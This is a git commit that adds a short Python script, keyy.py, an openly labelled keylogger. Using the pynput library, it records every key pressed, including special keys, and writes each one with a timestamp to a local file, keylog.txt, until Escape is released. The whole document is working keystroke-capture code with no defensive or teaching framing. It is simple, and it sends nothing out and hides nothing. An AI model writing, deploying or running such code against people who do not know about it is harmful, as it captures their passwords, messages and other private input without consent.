c8541e30d2fbaa7c8ce3bd46c50079dfd5b4edf9
Omkar3490 <omkard3490@gmail.com>
2025-12-29 11:47:40 +0530

    Add files via upload

---
+++ keyy.py
@@ -0,0 +1,23 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+# Configure log file
+logging.basicConfig(
+    filename="keylog.txt",
+    level=logging.INFO,
+    format="%(asctime)s - %(message)s"
+)
+
+def on_press(key):
+    try:
+        logging.info(key.char)
+    except AttributeError:
+        logging.info(str(key))
+
+def on_release(key):
+    if key == Key.esc:
+        return False   # Stop listener
+
+# Start key logger
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
